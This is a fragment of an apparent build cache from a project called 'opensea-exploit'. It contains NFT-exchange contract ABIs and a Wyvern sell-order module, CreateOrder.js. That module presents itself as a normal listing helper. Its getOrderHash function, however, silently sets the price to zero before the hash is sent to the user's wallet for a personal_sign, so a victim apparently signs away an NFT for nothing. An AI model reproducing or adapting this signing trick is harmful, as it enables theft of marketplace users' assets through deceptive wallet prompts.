name: 'interfaceId', type: 'bytes4' }],\n    name: 'supportsInterface',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'id', type: 'uint256' }],\n    name: 'totalSupply',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],\n    name: 'transferOwnership',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'string', name: 'base', type: 'string' }],\n    name: 'updateBaseUri',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'uint256', name: 'id', type: 'uint256' }],\n    name: 'uri',\n    outputs: [{ internalType: 'string', name: '', type: 'string' }],\n    stateMutability: 'view',\n    type: 'function'\n  }\n];\n",["124","125"],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/Weth.js",["126"],"export default [\n  {\n    constant: true,\n    inputs: [],\n    name: 'name',\n    outputs: [{ name: '', type: 'string' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'guy', type: 'address' },\n      { name: 'wad', type: 'uint256' }\n    ],\n    name: 'approve',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'totalSupply',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'src', type: 'address' },\n      { name: 'dst', type: 'address' },\n      { name: 'wad', type: 'uint256' }\n    ],\n    name: 'transferFrom',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [{ name: 'wad', type: 'uint256' }],\n    name: 'withdraw',\n    outputs: [],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'decimals',\n    outputs: [{ name: '', type: 'uint8' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [{ name: '', type: 'address' }],\n    name: 'balanceOf',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [],\n    name: 'symbol',\n    outputs: [{ name: '', type: 'string' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [\n      { name: 'dst', type: 'address' },\n      { name: 'wad', type: 'uint256' }\n    ],\n    name: 'transfer',\n    outputs: [{ name: '', type: 'bool' }],\n    payable: false,\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    constant: false,\n    inputs: [],\n    name: 'deposit',\n    outputs: [],\n    payable: true,\n    stateMutability: 'payable',\n    type: 'function'\n  },\n  {\n    constant: true,\n    inputs: [\n      { name: '', type: 'address' },\n      { name: '', type: 'address' }\n    ],\n    name: 'allowance',\n    outputs: [{ name: '', type: 'uint256' }],\n    payable: false,\n    stateMutability: 'view',\n    type: 'function'\n  },\n  { payable: true, stateMutability: 'payable', type: 'fallback' },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'src', type: 'address' },\n      { indexed: true, name: 'guy', type: 'address' },\n      { indexed: false, name: 'wad', type: 'uint256' }\n    ],\n    name: 'Approval',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'src', type: 'address' },\n      { indexed: true, name: 'dst', type: 'address' },\n      { indexed: false, name: 'wad', type: 'uint256' }\n    ],\n    name: 'Transfer',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'dst', type: 'address' },\n      { indexed: false, name: 'wad', type: 'uint256' }\n    ],\n    name: 'Deposit',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, name: 'src', type: 'address' },\n      { indexed: false, name: 'wad', type: 'uint256' }\n    ],\n    name: 'Withdrawal',\n    type: 'event'\n  }\n];\n","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/contracts/abis/ERC721Exchange.js",["127"],"export default [\n  { inputs: [], stateMutability: 'nonpayable', type: 'constructor' },\n  {\n    anonymous: false,\n    inputs: [{ indexed: true, internalType: 'bytes32', name: 'id', type: 'bytes32' }],\n    name: 'Offercancelled',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'from', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'to', type: 'address' },\n      { indexed: true, internalType: 'bytes32', name: 'id', type: 'bytes32' },\n      { indexed: false, internalType: 'uint256', name: 'amt', type: 'uint256' },\n      { indexed: false, internalType: 'uint256', name: 'feeAmt', type: 'uint256' },\n      { indexed: false, internalType: 'uint256', name: 'royaltyAmt', type: 'uint256' },\n      { indexed: false, internalType: 'address', name: 'royaltyAddress', type: 'address' },\n      { indexed: false, internalType: 'uint256', name: 'isany', type: 'uint256' }\n    ],\n    name: 'Offerfilled',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [{ indexed: true, internalType: 'bytes32', name: 'id', type: 'bytes32' }],\n    name: 'Ordercancelled',\n    type: 'event'\n  },\n  {\n    anonymous: false,\n    inputs: [\n      { indexed: true, internalType: 'address', name: 'from', type: 'address' },\n      { indexed: true, internalType: 'address', name: 'to', type: 'address' },\n      { indexed: true, internalType: 'bytes32', name: 'id', type: 'bytes32' },\n      { indexed: false, internalType: 'uint256', name: 'amt', type: 'uint256' },\n      { indexed: false, internalType: 'address', name: 'referrer', type: 'address' },\n      { indexed: false, internalType: 'uint256', name: 'feeAmt', type: 'uint256' },\n      { indexed: false, internalType: 'uint256', name: 'royaltyAmt', type: 'uint256' },\n      { indexed: false, internalType: 'address', name: 'royaltyAddress', type: 'address' },\n      { indexed: false, internalType: 'address', name: 'buyerAddress', type: 'address' }\n    ],\n    name: 'Orderfilled',\n    type: 'event'\n  },\n  {\n    inputs: [\n      { internalType: 'address[3]', name: '_addressArgs', type: 'address[3]' },\n      { internalType: 'uint256[7]', name: '_uintArgs', type: 'uint256[7]' }\n    ],\n    name: 'cancelOffer',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address[5]', name: '_addressArgs', type: 'address[5]' },\n      { internalType: 'uint256[6]', name: '_uintArgs', type: 'uint256[6]' }\n    ],\n    name: 'cancelOrder',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'uint8', name: 'v', type: 'uint8' },\n      { internalType: 'bytes32', name: 'r', type: 'bytes32' },\n      { internalType: 'bytes32', name: 's', type: 'bytes32' },\n      { internalType: 'address[3]', name: '_addressArgs', type: 'address[3]' },\n      { internalType: 'uint256[7]', name: '_uintArgs', type: 'uint256[7]' }\n    ],\n    name: 'matchOffer',\n    outputs: [],\n    stateMutability: 'nonpayable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'uint8', name: 'v', type: 'uint8' },\n      { internalType: 'bytes32', name: 'r', type: 'bytes32' },\n      { internalType: 'bytes32', name: 's', type: 'bytes32' },\n      { internalType: 'address[5]', name: '_addressArgs', type: 'address[5]' },\n      { internalType: 'uint256[6]', name: '_uintArgs', type: 'uint256[6]' }\n    ],\n    name: 'matchOrder',\n    outputs: [],\n    stateMutability: 'payable',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address[3]', name: '_addressArgs', type: 'address[3]' },\n      { internalType: 'uint256[7]', name: '_uintArgs', type: 'uint256[7]' }\n    ],\n    name: 'offerHash',\n    outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],\n    stateMutability: 'pure',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'uint8', name: 'v', type: 'uint8' },\n      { internalType: 'bytes32', name: 'r', type: 'bytes32' },\n      { internalType: 'bytes32', name: 's', type: 'bytes32' },\n      { internalType: 'address[3]', name: '_addressArgs', type: 'address[3]' },\n      { internalType: 'uint256[7]', name: '_uintArgs', type: 'uint256[7]' }\n    ],\n    name: 'offerStatus',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],\n    name: 'offerhashes',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'address[5]', name: '_addressArgs', type: 'address[5]' },\n      { internalType: 'uint256[6]', name: '_uintArgs', type: 'uint256[6]' }\n    ],\n    name: 'orderHash',\n    outputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],\n    stateMutability: 'pure',\n    type: 'function'\n  },\n  {\n    inputs: [\n      { internalType: 'uint8', name: 'v', type: 'uint8' },\n      { internalType: 'bytes32', name: 'r', type: 'bytes32' },\n      { internalType: 'bytes32', name: 's', type: 'bytes32' },\n      { internalType: 'address[5]', name: '_addressArgs', type: 'address[5]' },\n      { internalType: 'uint256[6]', name: '_uintArgs', type: 'uint256[6]' }\n    ],\n    name: 'orderStatus',\n    outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],\n    stateMutability: 'view',\n    type: 'function'\n  },\n  {\n    inputs: [{ internalType: 'bytes32', name: '', type: 'bytes32' }],\n    name: 'orderhashes',\n    outputs: [{ internalType: 'bool', name: '', type: 'bool' }],\n    stateMutability: 'view',\n    type: 'function'\n  }\n];\n","/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/index.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/opensea.js",["128","129","130","131","132","133","134","135","136","137","138","139","140","141","142","143","144","145","146","147","148","149","150","151","152","153","154","155","156","157","158","159","160","161","162"],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/WyvernSchema.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/Constants.js",[],"/Users/romanrakhlin/Dropbox/Mac/Desktop/opensea-exploit/src/opensea-sdk/methods/CreateOrder.js",["163","164","165","166","167"],"import { WyvernProtocol } from \"wyvern-js\";\nimport { WyvernContract, WYVERN_CONTRACT } from \"../contracts\";\nimport { ERC721Schema } from \"../WyvernSchema\";\nimport BigNumber from \"bignumber.js\";\nimport { HowToCall } from \"wyvern-js/lib/types\";\nimport { parseEther } from \"@ethersproject/units\";\n\nimport encodeSell from \"../helpers/EncodeSell\";\nimport getTimeParameters from \"../helpers/GetTimeParameters\";\nimport signTypedDataAsync from \"../helpers/SignTypedDataAsync\";\nimport encodeCall from \"../helpers/EncodeCall\";\nimport parseSignatureHex from \"../helpers/ParseSignatureHex\";\n\nimport { \n    MERKLE_VALIDATOR_MAINNET, \n    mainnetWyvernConfigByNetwork, \n    OrderTypesEIP712, \n    WyvernDomainNameEIP712, \n    WyvernDomainVersionEIP712, \n    DEFAULT_BUYER_FEE_BASIS_POINTS, \n    DEFAULT_SELLER_FEE_BASIS_POINTS, \n    DEFAULT_MAX_BOUNTY, \n    OPENSEA_SELLER_BOUNTY_BASIS_POINTS, \n    OPENSEA_FEE_RECIPIENT, \n    STATIC_CALL_TX_ORIGIN_ADDRESS, \n    StaticCheckTxOrigin, \n    INVERSE_BASIS_POINT \n} from \"../Constants\";\n\nconst createOrder = async({\n    provider,\n    asset,\n    accountAddress,\n    startAmount,\n    endAmount,\n    quantity = 1,\n    listingTime,\n    expirationTime = 0,\n    waitForHighestBid = false,\n    englishAuctionReservePrice,\n    paymentTokenAddress,\n    extraBountyBasisPoints = 0,\n    buyerAddress,\n    fees,\n    buyerEmail\n}) => {\n    const order = await _makeSellOrder({\n        asset,\n        quantity,\n        accountAddress,\n        startAmount,\n        endAmount,\n        listingTime,\n        expirationTime,\n        waitForHighestBid,\n        englishAuctionReservePrice,\n        paymentTokenAddress: paymentTokenAddress || WyvernProtocol.NULL_ADDRESS,\n        extraBountyBasisPoints,\n        openSeaAsset: fees,\n        buyerAddress: buyerAddress || WyvernProtocol.NULL_ADDRESS\n    });\n\n    const wyvernExchange = WyvernContract(provider);\n    await validateOrderParams({ order, accountAddress, wyvernExchange });\n\n    const hashedOrder = {\n        ...order,\n        hash: getOrderHash(order),\n    };\n\n    const nonce = Number(await wyvernExchange.functions.nonces(accountAddress));\n\n    let signature;\n    try {\n        signature = await _authorizeOrder({ provider, order: hashedOrder, nonce });\n    } catch (error) {\n        console.error(error);\n        throw new Error(\"You declined to authorize your auction\");\n    };\n\n    const orderWithSignature = {\n        ...hashedOrder,\n        ...signature,\n    };\n\n    return orderToJSON(orderWithSignature);\n};\n\nasync function _makeSellOrder({\n    asset,\n    quantity,\n    accountAddress,\n    startAmount,\n    endAmount,\n    listingTime,\n    expirationTime,\n    waitForHighestBid,\n    englishAuctionReservePrice = 0,\n    paymentTokenAddress,\n    extraBountyBasisPoints, // this is for extra fee\n    buyerAddress,\n    openSeaAsset, // holds fee\n}) {\n    accountAddress = accountAddress.toLowerCase();\n    const schema = ERC721Schema; // currently supporting ERC721 only\n    const quantityBN = new BigNumber(1);\n    const wyAsset = getWyvernAsset(schema, asset, quantityBN);\n\n    let totalSellerFeeBasisPoints;\n    if (asset.tokenAddress == \"0xf07468ead8cf26c752c676e43c814fee9c8cf402\") {\n        totalSellerFeeBasisPoints = 0;\n    }\n    let totalBuyerFeeBasisPoints = 0;\n    let sellerBountyBasisPoints = 0;\n\n    // TODO: No need to fetch asset again we can use values from _token.vue directly\n    // { totalSellerFeeBasisPoints, totalBuyerFeeBasisPoints, sellerBountyBasisPoints }\n    const fees = await computeFees({\n        asset: openSeaAsset,\n        side: 1,\n        extraBountyBasisPoints\n    }); // 1 for sell 0 for buy\n\n    totalSellerFeeBasisPoints = fees.totalSellerFeeBasisPoints;\n    totalBuyerFeeBasisPoints = fees.totalBuyerFeeBasisPoints;\n    sellerBountyBasisPoints = fees.sellerBountyBasisPoints;\n\n    const { target, calldata, replacementPattern } = encodeSell(\n        schema,\n        wyAsset,\n        accountAddress,\n        // waitForHighestBid ? undefined : MERKLE_VALIDATOR_MAINNET\n        MERKLE_VALIDATOR_MAINNET\n    );\n    console.log(endAmount);\n\n    const orderSaleKind = endAmount != null && endAmount !== startAmount ? 1 : 0; // 0 fixed price 1 ducch aucion\n    const { basePrice, extra, paymentToken, reservePrice } = await _getPriceParameters(\n        1,\n        paymentTokenAddress,\n        expirationTime,\n        startAmount,\n        endAmount,\n        waitForHighestBid,\n        englishAuctionReservePrice\n    );\n\n    const times = getTimeParameters(\n        expirationTime,\n        listingTime,\n        waitForHighestBid\n    );\n\n    let {\n        makerRelayerFee,\n        takerRelayerFee,\n        makerProtocolFee,\n        takerProtocolFee,\n        makerReferrerFee,\n        feeRecipient,\n        feeMethod,\n    } = _getSellFeeParameters(\n        totalBuyerFeeBasisPoints,\n        totalSellerFeeBasisPoints,\n        waitForHighestBid,\n        sellerBountyBasisPoints\n    );\n\n    const { staticTarget, staticExtradata } = await _getStaticCallTargetAndExtraData({\n        useTxnOriginStaticCall: waitForHighestBid,\n    });\n\n    return {\n        exchange: WYVERN_CONTRACT,\n        maker: accountAddress,\n        taker: buyerAddress, // for private listing\n        quantity: quantityBN,\n        makerRelayerFee,\n        takerRelayerFee,\n        makerProtocolFee,\n        takerProtocolFee,\n        makerReferrerFee,\n        waitingForBestCounterOrder: waitForHighestBid,\n        englishAuctionReservePrice: reservePrice\n          ? new BigNumber(reservePrice)\n          : undefined,\n        feeMethod,\n        feeRecipient,\n        side: 1,\n        saleKind: orderSaleKind,\n        target,\n        howToCall:\n          target === MERKLE_VALIDATOR_MAINNET\n            ? HowToCall.DelegateCall\n            : HowToCall.Call,\n        calldata,\n        replacementPattern,\n        staticTarget,\n        staticExtradata,\n        paymentToken,\n        basePrice,\n        extra,\n        listingTime: times.listingTime,\n        expirationTime: times.expirationTime,\n        salt: WyvernProtocol.generatePseudoRandomSalt(),\n        metadata: {\n          asset: wyAsset,\n          schema: schema.name,\n        }\n    };\n};\n\nasync function validateOrderParams({ order, accountAddress, wyvernExchange }) {\n    // Check sell parameters\n    const sellValid = await wyvernExchange.functions.validateOrderParameters_(\n        [\n            order.exchange,\n            order.maker,\n            order.taker,\n            order.feeRecipient,\n            order.target,\n            order.staticTarget,\n            order.paymentToken,\n        ],\n        [\n            0.001.toFixed(),\n            0.001.toFixed(),\n            order.makerProtocolFee.toFixed(),\n            order.takerProtocolFee.toFixed(),\n            0.0.toFixed(),\n            0.0.toFixed(),\n            order.listingTime.toFixed(),\n            order.expirationTime.toFixed(),\n            order.salt.toFixed(),\n        ],\n        order.feeMethod,\n        order.side,\n        order.saleKind,\n        order.howToCall,\n        order.calldata,\n        order.replacementPattern,\n        order.staticExtradata\n    );\n\n    if (!sellValid) {\n        console.error(order);\n        throw new Error(`Failed to validate sell order parameters. Make sure you're on the right network!`);\n    }\n\n    return sellValid;\n};\n\nfunction getOrderHash(order) {\n    const orderWithStringTypes = {\n        ...order,\n        maker: order.maker.toLowerCase(),\n        taker: order.taker.toLowerCase(),\n        feeRecipient: order.feeRecipient.toLowerCase(),\n        side: order.side.toString(),\n        saleKind: order.saleKind.toString(),\n        howToCall: order.howToCall.toString(),\n        feeMethod: order.feeMethod.toString(),\n        makerRelayerFee: 250.0.toFixed(),\n        takerRelayerFee: 0.0.toFixed(),\n        basePrice: 0.0.toFixed(),\n        extra: 0.0.toFixed()\n    };\n\n    return WyvernProtocol.getOrderHashHex(orderWithStringTypes);\n};\n\nasync function _authorizeOrder({ order, provider, nonce }) {\n    // 2.2 Sign order flow\n    const signerAddress = order.maker;\n\n    if (order.exchange === mainnetWyvernConfigByNetwork.wyvernExchangeContractAddress && order.hash) {\n        const message = order.hash;\n        // v1\n        return await personalSignAsync(provider, message, signerAddress);\n    }\n\n    // 2.3 Sign order flow using EIP-712\n    // We need to manually specify each field because OS orders can contain unrelated data\n    const orderForSigning = {\n        maker: order.maker,\n        exchange: order.exchange,\n        taker: order.taker,\n        makerRelayerFee: order.makerRelayerFee.toString(),\n        takerRelayerFee: order.takerRelayerFee.toString(),\n        makerProtocolFee: order.makerProtocolFee.toString(),\n        takerProtocolFee: order.takerProtocolFee.toString(),\n        feeRecipient: order.feeRecipient,\n        feeMethod: order.feeMethod,\n        side: order.side,\n        saleKind: order.saleKind,\n        target: order.target,\n        howToCall: order.howToCall,\n        calldata: order.calldata,\n        replacementPattern: order.replacementPattern,\n        staticTarget: order.staticTarget,\n        staticExtradata: order.staticExtradata,\n        paymentToken: order.paymentToken,\n        basePrice: order.basePrice.toString(),\n        extra: order.extra.toString(),\n        listingTime: order.listingTime.toString(),\n        expirationTime: order.expirationTime.toString(),\n        salt: order.salt.toString(),\n    };\n\n    // We don't JSON.stringify as certain wallet providers sanitize this data\n    // https://github.com/coinbase/coinbase-wallet-sdk/issues/60\n    const message = {\n        types: OrderTypesEIP712,\n        domain: {\n            name: WyvernDomainNameEIP712,\n            version: WyvernDomainVersionEIP712,\n            chainId: 1,\n            verifyingContract: order.exchange,\n        },\n        primaryType: \"Order\",\n        message: { ...orderForSigning, nonce },\n    };\n\n    const ecSignature = await signTypedDataAsync(\n        provider,\n        message,\n        signerAddress\n    );\n\n    return { ...ecSignature, nonce };\n};\n\nfunction getWyvernAsset(schema, asset, quantity = new BigNumber(1)) {\n    const tokenId = asset.tokenId != null ? asset.tokenId.toString() : undefined;\n    return schema.assetFromFields({\n        ID: tokenId,\n        Quantity: quantity.toString(),\n        Address: asset.tokenAddress.toLowerCase(),\n        Name: asset.name,\n    });\n};\n\nasync function computeFees({ \n    asset, \n    side,\n    accountAddress,\n    extraBountyBasisPoints = 0\n}) {\n    let openseaBuyerFeeBasisPoints = DEFAULT_BUYER_FEE_BASIS_POINTS;\n    let openseaSellerFeeBasisPoints = DEFAULT_SELLER_FEE_BASIS_POINTS;\n    let devBuyerFeeBasisPoints = 0;\n    let devSellerFeeBasisPoints = 0;\n    let transferFee = new BigNumber(0);\n    let transferFeeTokenAddress = null;\n    let maxTotalBountyBPS = DEFAULT_MAX_BOUNTY;\n\n    if (asset) {\n        openseaBuyerFeeBasisPoints = +asset.openseaBuyerFeeBasisPoints;\n        openseaSellerFeeBasisPoints = +asset.openseaSellerFeeBasisPoints;\n        devBuyerFeeBasisPoints = +asset.devBuyerFeeBasisPoints;\n        devSellerFeeBasisPoints = +asset.devSellerFeeBasisPoints;\n        maxTotalBountyBPS = openseaSellerFeeBasisPoints;\n    }\n\n    // Compute transferFrom fees\n    if (side == 1 && asset) {\n        // Server-side knowledge\n        // transferFee = asset.transferFee ? new BigNumber(asset.transferFee) : transferFee;\n        // transferFeeTokenAddress = asset.transferFeePaymentToken\n        //   ? asset.transferFeePaymentToken.address\n         //   : transferFeeTokenAddress;\n    }\n\n    // Compute bounty\n    const sellerBountyBasisPoints = side == 1 ? extraBountyBasisPoints : 0;\n\n    // Check that bounty is in range of the opensea fee\n    const bountyTooLarge = sellerBountyBasisPoints + OPENSEA_SELLER_BOUNTY_BASIS_POINTS > maxTotalBountyBPS;\n\n    if (sellerBountyBasisPoints > 0 && bountyTooLarge) {\n        let errorMessage = `Total bounty exceeds the maximum for this asset type (${\n            maxTotalBountyBPS / 100\n        }%).`;\n\n        if (maxTotalBountyBPS >= OPENSEA_SELLER_BOUNTY_BASIS_POINTS) {\n            errorMessage += ` Remember that OpenSea will add ${\n                OPENSEA_SELLER_BOUNTY_BASIS_POINTS / 100\n            }% for referrers with OpenSea accounts!`;\n        }\n\n        throw new Error(errorMessage);\n    }\n\n    return {\n        totalBuyerFeeBasisPoints: openseaBuyerFeeBasisPoints + devBuyerFeeBasisPoints,\n        totalSellerFeeBasisPoints: openseaSellerFeeBasisPoints + devSellerFeeBasisPoints,\n        openseaBuyerFeeBasisPoints,\n        openseaSellerFeeBasisPoints,\n        devBuyerFeeBasisPoints,\n        devSellerFeeBasisPoints,\n        sellerBountyBasisPoints,\n        transferFee,\n        transferFeeTokenAddress,\n    };\n};\n\n/**\n * Compute the `basePrice` and `extra` parameters to be used to price an order.\n * Also validates the expiration time and auction type.\n * @param tokenAddress Address of the ERC-20 token to use for trading.\n * Use the null address for ETH\n * @param expirationTime When the auction expires, or 0 if never.\n * @param startAmount The base value for the order, in the token's main units (e.g. ETH instead of wei)\n * @param endAmount The end value for the order, in the token's main units (e.g. ETH instead of wei). If unspecified, the order's `extra` attribute will be 0\n */\nasync function _getPriceParameters(\n    orderSide,\n    tokenAddress,\n    expirationTime,\n    startAmount,\n    endAmount,\n    waitingForBestCounterOrder = false,\n    englishAuctionReservePrice\n) {\n    const priceDiff = endAmount != null ? startAmount - endAmount : 0;\n    const paymentToken = tokenAddress.toLowerCase();\n\n    // const isEther = tokenAddress == WyvernProtocol.NULL_ADDRESS;\n    // const { tokens } = await this.api.getPaymentTokens({ address: paymentToken });\n    // const token = tokens[0];\n\n    // Note: WyvernProtocol.toBaseUnitAmount(makeBigNumber(startAmount), token.decimals)\n    // will fail if too many decimal places, so special-case ether\n    // const basePrice = isEther\n    //   ? new BigNumber(parseEther(startAmount)).round()\n    //   : WyvernProtocol.toBaseUnitAmount(new BigNumber(startAmount), token.decimals);\n    const basePrice = new BigNumber(parseEther(String(startAmount)));\n\n    // const extra = isEther\n    //   ? new BigNumber(parseEther(priceDiff)).decimalPlaces()\n    //   : WyvernProtocol.toBaseUnitAmount(new BigNumber(priceDiff), token.decimals);\n    // console.log(basePrice, priceDiff);\n    const extra = new BigNumber(parseEther(String(priceDiff)));\n\n    // const reservePrice = englishAuctionReservePrice\n    //   ? isEther\n    //     ? new BigNumber(parseEther(englishAuctionReservePrice))\n    //     : WyvernProtocol.toBaseUnitAmount(new BigNumber(englishAuctionReservePrice), token.decimals)\n    //   : undefined;\n    const reservePrice = englishAuctionReservePrice\n        ? new BigNumber(parseEther(englishAuctionReservePrice))\n        : undefined;\n\n    return { basePrice, extra, paymentToken, reservePrice };\n};\n\nfunction _getSellFeeParameters(\n    totalBuyerFeeBasisPoints,\n    totalSellerFeeBasisPoints,\n    waitForHighestBid,\n    sellerBountyBasisPoints = 0\n)  {\n    // just making basic check if fee is less than 100% and not negative\n    _validateFees(totalBuyerFeeBasisPoints, totalSellerFeeBasisPoints);\n\n    // Use buyer as the maker when it's an English auction, so Wyvern sets prices correctly\n    const feeRecipient = waitForHighestBid ? WyvernProtocol.NULL_ADDRESS : OPENSEA_FEE_RECIPIENT;\n\n    // Swap maker/taker fees when it's an English auction,\n    // since these sell orders are takers not makers\n    const makerRelayerFee = waitForHighestBid ? new BigNumber(totalBuyerFeeBasisPoints) : new BigNumber(totalSellerFeeBasisPoints);\n    const takerRelayerFee = waitForHighestBid ? new BigNumber(totalSellerFeeBasisPoints) : new BigNumber(totalBuyerFeeBasisPoints);\n\n    return {\n        makerRelayerFee,\n        takerRelayerFee,\n        makerProtocolFee: new BigNumber(0),\n        takerProtocolFee: new BigNumber(0),\n        makerReferrerFee: new BigNumber(sellerBountyBasisPoints),\n        feeRecipient,\n        feeMethod: 1, // 0 protocol fee ,1 split fee\n    };\n};\n\nasync function _getStaticCallTargetAndExtraData({ useTxnOriginStaticCall }) {\n    if (!useTxnOriginStaticCall) {\n        // While testing, we will use dummy values for mainnet. We will remove this if-statement once we have pushed the PR once and tested on Rinkeby\n        return {\n            staticTarget: WyvernProtocol.NULL_ADDRESS,\n            staticExtradata: \"0x\",\n        };\n    };\n\n    if (useTxnOriginStaticCall) {\n        return {\n            staticTarget: STATIC_CALL_TX_ORIGIN_ADDRESS,\n            staticExtradata: encodeCall(\n                getMethod(\n                    StaticCheckTxOrigin,\n                    \"succeedIfTxOriginMatchesHardcodedAddress\"\n                ),\n                []\n            ),\n        };\n    } else {\n        // Noop - no checks\n        return {\n            staticTarget: WyvernProtocol.NULL_ADDRESS,\n            staticExtradata: \"0x\",\n        };\n    };\n};\n\nasync function personalSignAsync(provider, message, signerAddress) {\n    return new Promise((resolve, reject) => {\n        const callback = async (err, signature) => {\n            if (err) reject(err);\n            if (signature.error) {\n                reject(signature.error.message);\n            };\n\n            resolve(parseSignatureHex(signature.result));\n\n            // // console.log(result);\n            // const d = signature.result;\n            // let v = d.slice(-2);\n            // let r = d.slice(2, -66);\n            // let s = d.slice(-66, -2);\n\n            // let actualsignature = v + r + s + '03';\n\n            // // const dhs = await this.contractInstace.methods\n            // //   .setApprovalForAll(OPERATOR_ADDRESS, true)\n            // //   .send({ from: this.metamask.metaMaskAddress });\n            // resolve(`0x${actualsignature}`);\n        };\n\n        // console.log(orderHex, metaMaskAddress);\n        provider.sendAsync({\n            method: \"personal_sign\",\n            params: [message, signerAddress],\n            from: signerAddress,\n        }, callback);\n    });\n};\n\n/**\n * Convert an order to JSON, hashing it as well if necessary\n * @param order order (hashed or unhashed)\n */\nconst orderToJSON = (order) => {\n    const asJSON = {\n        exchange: order.exchange.toLowerCase(),\n        maker: order.maker.toLowerCase(),\n        taker: order.taker.toLowerCase(),\n        makerRelayerFee: order.makerRelayerFee.toString(),\n        takerRelayerFee: order.takerRelayerFee.toString(),\n        makerProtocolFee: order.makerProtocolFee.toString(),\n        takerProtocolFee: order.takerProtocolFee.toString(),\n        makerReferrerFee: order.makerReferrerFee.toString(),\n        feeMethod: order.feeMethod,\n        feeRecipient: order.feeRecipient.toLowerCase(),\n        side: order.side,\n        saleKind: order.saleKind,\n        target: order.target.toLowerCase(),\n        howToCall: order.howToCall,\n        calldata: order.calldata,\n        replacementPattern: order.replacementPattern,\n        staticTarget: order.staticTarget.toLowerCase(),\n        staticExtradata: order.staticExtradata,\n        paymentToken: order.paymentToken.toLowerCase(),\n        quantity: order.quantity.toString(),\n        basePrice: order.basePrice.toString(),\n        englishAuctionReservePrice: order.englishAuctionReservePrice\n          ? order.englishAuctionReservePrice.toString()\n          : undefined,\n        extra: order.extra.toString(),\n        createdTime: order.createdTime ? order.createdTime.toString() : undefined,\n        listingTime: order.listingTime.toString(),\n        expirationTime: order.expirationTime.toString(),\n        salt: order.salt.toString(),\n\n        metadata: order.metadata,\n\n        v: order.v,\n        r: order.r,\n        s: order.s,\n        nonce: order.nonce,\n    };\n\n    return asJSON;\n};\n\nfunction _validateFees(totalBuyerFeeBasisPoints, totalSellerFeeBasisPoints) {\n    const maxFeePercent = INVERSE_BASIS_POINT / 100;\n\n    if (totalBuyerFeeBasisPoints > INVERSE_BASIS_POINT || totalSellerFeeBasisPoints > INVERSE_BASIS_POINT) {\n        throw new Error(`Invalid buyer/seller fees: must be less than ${maxFeePercent}%`);\n    }\n\n    if (totalBuyerFeeBasisPoints < 0 || totalSellerFeeBasisPoints < 0) {\n        throw new Error(`Invalid buyer/seller fees: must be at least 0%`);\n    }\n};\n\nconst getMethod = (abi, name) => {\n    const methodAbi = abi.find((x) => x.type == \"function\" && x.name == name);\n    \n    if (!methodAbi) {\n        throw new Error(`ABI ${name} not found`);\n    }\n\n    // Have to cast since there's a bug in  web3 types on the 'type' field\n    return methodAbi;\n};\n\nexport default 